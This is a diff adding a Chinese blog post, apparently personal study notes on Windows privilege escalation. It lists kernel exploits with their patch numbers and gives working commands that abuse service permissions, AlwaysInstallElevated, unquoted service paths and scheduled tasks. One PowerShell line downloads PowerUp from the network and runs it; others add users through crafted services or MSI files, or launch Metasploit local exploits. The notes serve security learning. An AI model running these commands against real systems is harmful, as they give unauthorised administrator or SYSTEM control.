@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="继续学习内网安全，这是第四章以及拓展Linux提权的总结… 一、Windows提权Windows权限在windows中，权限大概分为4种，分别是User、Administrator、System、TrustedInstaller。 User：普通用户权限，是系统中权限最低的用户； Administrator：管理员权限，相对来说权限较高。可以利用Windows的机制提权为System，从而操作SA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全学习笔记-Ⅳ：权限提升">
+<meta property="og:url" content="http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="继续学习内网安全，这是第四章以及拓展Linux提权的总结… 一、Windows提权Windows权限在windows中，权限大概分为4种，分别是User、Administrator、System、TrustedInstaller。 User：普通用户权限，是系统中权限最低的用户； Administrator：管理员权限，相对来说权限较高。可以利用Windows的机制提权为System，从而操作SA">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210122194452107.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210122105856136.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210123134027171.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210127145327674.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210127145146086.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210127145821823.png">
+<meta property="article:published_time" content="2021-01-20T12:55:20.000Z">
+<meta property="article:modified_time" content="2021-01-20T12:55:20.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="内网安全">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210122194452107.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>内网安全学习笔记-Ⅳ：权限提升</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&text=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&is_video=false&description=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习笔记-Ⅳ：权限提升&body=Check out this article: http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&name=内网安全学习笔记-Ⅳ：权限提升&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A3%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&t=内网安全学习笔记-Ⅳ：权限提升" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、Windows提权"><span class="toc-number">1.</span> <span class="toc-text">一、Windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows权限"><span class="toc-number">1.1.</span> <span class="toc-text">Windows权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见提权方法"><span class="toc-number">1.2.</span> <span class="toc-text">常见提权方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、内核漏洞提权"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#常用的提权漏洞："><span class="toc-number">1.2.1.1.</span> <span class="toc-text">常用的提权漏洞：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#寻找缺失补丁"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">寻找缺失补丁</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、系统配置错误提权"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、系统配置错误提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#系统权限配置错误"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">系统权限配置错误</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#注册表键AlwaysInstallElevated提权"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">注册表键AlwaysInstallElevated提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#可信任服务路径漏洞"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">可信任服务路径漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#计划任务"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、组策略首选项提权"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、组策略首选项提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、绕过UAC提权"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、绕过UAC提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、令牌窃取"><span class="toc-number">1.2.5.</span> <span class="toc-text">5、令牌窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、数据库提权"><span class="toc-number">1.2.6.</span> <span class="toc-text">6、数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Mysql提权、SQL-Server提权"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">Mysql提权、SQL Server提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、Linux提权"><span class="toc-number">2.</span> <span class="toc-text">二、Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、内核漏洞提权-1"><span class="toc-number">2.1.</span> <span class="toc-text">1、内核漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、明文root密码提权"><span class="toc-number">2.2.</span> <span class="toc-text">2、明文root密码提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用："><span class="toc-number">2.2.1.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、密码复用"><span class="toc-number">2.3.</span> <span class="toc-text">3、密码复用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、sudo滥用"><span class="toc-number">2.4.</span> <span class="toc-text">4、sudo滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SU"><span class="toc-number">2.4.1.</span> <span class="toc-text">SU:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#awk"><span class="toc-number">2.4.2.</span> <span class="toc-text">awk:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#man"><span class="toc-number">2.4.3.</span> <span class="toc-text">man:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、su-root被禁止登录"><span class="toc-number">2.5.</span> <span class="toc-text">5、su root被禁止登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#场景："><span class="toc-number">2.5.1.</span> <span class="toc-text">场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#原因："><span class="toc-number">2.5.2.</span> <span class="toc-text">原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-1"><span class="toc-number">2.5.3.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6、计划任务"><span class="toc-number">2.6.</span> <span class="toc-text">6、计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7、SUID"><span class="toc-number">2.7.</span> <span class="toc-text">7、SUID</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查找正在系统上运行的所有SUID可执行文件"><span class="toc-number">2.7.1.</span> <span class="toc-text">查找正在系统上运行的所有SUID可执行文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用：-2"><span class="toc-number">2.7.2.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8、Docker逃逸"><span class="toc-number">2.8.</span> <span class="toc-text">8、Docker逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-number">3.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网安全学习笔记-Ⅳ：权限提升
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-20T12:55:20.000Z" itemprop="datePublished">2021-01-20</time>
+        
+        (Updated: <time datetime="2021-01-20T12:55:20.000Z" itemprop="dateModified">2021-01-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag">内网安全</a>, <a class="tag-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>继续学习内网安全，这是第四章以及拓展Linux提权的总结…</p>
+<h2 id="一、Windows提权"><a href="#一、Windows提权" class="headerlink" title="一、Windows提权"></a>一、Windows提权</h2><h3 id="Windows权限"><a href="#Windows权限" class="headerlink" title="Windows权限"></a>Windows权限</h3><p>在windows中，权限大概分为4种，分别是User、Administrator、System、TrustedInstaller。</p>
+<p>User：普通用户权限，是系统中权限最低的用户；</p>
+<p>Administrator：管理员权限，相对来说权限较高。可以利用Windows的机制提权为System，从而操作SAM文件等；</p>
+<p>System：系统权限。可以对SAM等敏感文件进行读取，往往需要将administrator权限提升为system权限才可以对散列值进行Dump操作；</p>
+<p>TrustedInstaller：最高权限，常规使用中不会涉及。System对系统文件无法修改，只有TrustedInstaller才可以。</p>
+<p>Windows操作系统常用的提权方法有：<strong>系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、Web中间件漏洞提权、DLL劫持提权、滥用高权限令牌提权、第三方服务提权等。</strong></p>
+<img src="/imgs/image-20210122194452107.png" alt="image-20210122194452107" style="zoom:50%;" />
+
+<h3 id="常见提权方法"><a href="#常见提权方法" class="headerlink" title="常见提权方法"></a>常见提权方法</h3><h4 id="1、内核漏洞提权"><a href="#1、内核漏洞提权" class="headerlink" title="1、内核漏洞提权"></a>1、内核漏洞提权</h4><p>Windows平台提权漏洞合集：<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a></p>
+<h5 id="常用的提权漏洞："><a href="#常用的提权漏洞：" class="headerlink" title="常用的提权漏洞："></a>常用的提权漏洞：</h5><table>
+<thead>
+<tr>
+<th align="left">漏洞代号</th>
+<th align="left">补丁编号</th>
+<th align="left">适用平台</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">MS14-058</td>
+<td align="left">KB3000061</td>
+<td align="left">03，08，12，Win7</td>
+<td align="left">本地提权【CS常用】</td>
+</tr>
+<tr>
+<td align="left">MS14-068</td>
+<td align="left">KB3011780</td>
+<td align="left">域控未安装补丁的域内，03，08，12</td>
+<td align="left">域内提权</td>
+</tr>
+<tr>
+<td align="left">MS15-051</td>
+<td align="left">KB3057191</td>
+<td align="left">03，08，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS16-032</td>
+<td align="left">KB3143141</td>
+<td align="left">08 r2以后，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS17-010</td>
+<td align="left">KB4013389</td>
+<td align="left">03，08，12，16，win7</td>
+<td align="left">远程注入dll</td>
+</tr>
+<tr>
+<td align="left">CVE-2018-8120</td>
+<td align="left">KB4131188</td>
+<td align="left">08，win7</td>
+<td align="left">本地提权【MSF常用】</td>
+</tr>
+<tr>
+<td align="left">CVE-2020-1472</td>
+<td align="left"></td>
+<td align="left">08，12，16 ，19</td>
+<td align="left">域内提权</td>
+</tr>
+</tbody></table>
+<h5 id="寻找缺失补丁"><a href="#寻找缺失补丁" class="headerlink" title="寻找缺失补丁"></a>寻找缺失补丁</h5><p>寻找缺失补丁可以利用系统命令、MSF、Windows Exploit Suggester、Powershell的Sherlock脚本和CS的Elevate功能。</p>
+<p>利用系统命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"># 快速比对查找缺失补丁，注意这个要根据实际的系统版本来看。</span><br><span class="line">systeminfo &gt; temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3000061 KB3011780 KB3057191 KB3143141 KB4013389 KB4131188) <span class="keyword">do</span> @<span class="built_in">type</span> temp.txt|@<span class="built_in">find</span> /i  "%i"|| @<span class="built_in">echo</span> %i <span class="keyword">Not</span> Installed!)&amp;<span class="built_in">del</span> /f /q /a temp.txt</span><br></pre></td></tr></table></figure>
+
+<p>利用在线查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line">粘贴补丁号码或者systeminfo来进行查询</span><br></pre></td></tr></table></figure>
+
+<p>利用MSF：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br><span class="line">set session id</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>利用Windows Exploit Suggester：</p>
+<p>下载地址：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<p>Windows-Exploit-Suggester通过下载微软公开漏洞库到本地“生成日期+mssb.xls”文件，然后根据操作系统版本，和systeminfo生成的文件进行比对。微软公开漏洞库下载地址：<a href="http://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。" target="_blank" rel="noopener">http://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。</a></p>
+<p>利用Powershell Sherlock：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> C:\Sherlock.ps1</span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2、系统配置错误提权"><a href="#2、系统配置错误提权" class="headerlink" title="2、系统配置错误提权"></a>2、系统配置错误提权</h4><p>Windows系统常见的配置错误包括管理员凭据配置错误、服务配置错误、故意削弱的安全措施、用户权限过高等。</p>
+<p>系统配置错误提权有<strong>权限配置错误、注册表键AlwaysInstallElevated、可信任服务路径漏洞、自动安装配置文件、计划任务和Empire内置模块</strong>提权方式。</p>
+<h5 id="系统权限配置错误"><a href="#系统权限配置错误" class="headerlink" title="系统权限配置错误"></a>系统权限配置错误</h5><p>系统权限配置错误有如下两种可能：</p>
+<ul>
+<li>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</li>
+<li>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用DLL劫持技术并尝试重启服务来提取</li>
+</ul>
+<p>查找该漏洞有两种利用方式PowerUp和MSF。</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="noopener">PowerUp</a>利用方式：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下两种可以检测漏洞服务</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Comand</span> <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1');Invoke-AllChecks"</span></span><br><span class="line"><span class="comment"># 示例，根据上面检测出如果存在OmniServers服务漏洞，利用下面命令添加用户</span></span><br><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-exec</span> bypass IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'C:\PowerUp.ps1'</span>);<span class="built_in">Install-ServiceBinaery</span><span class="literal">-ServiceName</span> <span class="string">'OmniServers'</span> <span class="literal">-UserName</span> user1 <span class="literal">-Password</span> possword1</span><br></pre></td></tr></table></figure>
+
+<p>MSF利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br><span class="line">set aggressive true</span><br><span class="line">set session id</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h5 id="注册表键AlwaysInstallElevated提权"><a href="#注册表键AlwaysInstallElevated提权" class="headerlink" title="注册表键AlwaysInstallElevated提权"></a>注册表键AlwaysInstallElevated提权</h5><p>注册表键AlwaysInstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件，如果启用该策略设置项，呢么任何权限下的用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI（Microsoft Windows Installer）文件。</p>
+<p>漏洞原因：运维人员启用了组策略-计算机配置&amp;用户配置的管理模板-Windows组件-Windows Installer的始终以高权限进行安装。</p>
+<p>Windows Installer是Windows操作系统的组件之一，专门用来管理和安装软件服务。Windows Installer分为客户端安装服务（Msiexec.exe）和MSI文件两部分，Windows Installer通过Msiexec.exe安装MSI文件包含的程序。</p>
+<p><img src="/imgs/image-20210122105856136.png" alt="image-20210122105856136"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 对应注册表项，键值都是1</span><br><span class="line">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>利用方法：</p>
+<p>可以通过powerup进行利用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行</span></span><br><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-exec</span> bypass IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'C:\PowerUp.ps1'</span>);<span class="built_in">Get-RegistryAlwaysInstallElevated</span></span><br><span class="line"><span class="comment"># 运行Write-UserAddMSI模块生成MSI文件</span></span><br><span class="line"><span class="built_in">Write-UserAddMSI</span></span><br><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">msiexec /q /i UserAdd.msi</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">net user</span><br></pre></td></tr></table></figure>
+
+<h5 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h5><p>Windows服务通常以System权限运行，系统在解析文件路径时也会以System权限运行。如果一个服务的可执行文件的路径没有被双引号引起来且包含<strong>空格</strong>，那么这个服务就是有漏洞的。</p>
+<p>比如一个完整的文件路径<code>C:\Program Files\Some Folder\Service.exe</code>，系统会对路径中空格的所有可能情况进行测试，直至找到一个可执行的程序。</p>
+<p>C:\Program.exe</p>
+<p>C:\Program Files\Some.exe</p>
+<p>C:\Program Files\Some Folder\Service.exe</p>
+<p>因此当一个构造过命名的程序被上传到受影响的目录下时，服务一旦被重启，该程序就会以System权限运行。</p>
+<p>通过MSF利用：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 寻找存在漏洞的服务</span><br><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i "Auto" | <span class="built_in">findstr</span> /i /v "C:\Windows\\" | <span class="built_in">findstr</span> /i /v """</span><br><span class="line"># msf攻击模块</span><br><span class="line">exploit/windows/local/trusted_service_path</span><br><span class="line"># 正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程</span><br><span class="line"><span class="built_in">set</span> AutoRunScript migrate -f</span><br></pre></td></tr></table></figure>
+
+<h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样，在计划任务下次执行时，就会以以高权限来运行恶意程序。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看计算机的计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"># 查看指定目录的权限配置情况。accesschk是微软官方提供的工具，一般不会引起杀软告警</span><br><span class="line"># accesschk下载地址：http://technet.microsoft.com/ZH-cn/sysinternals/bb664922</span><br><span class="line">accesschk.exe -dqv "D:\test" -accepteula</span><br></pre></td></tr></table></figure>
+
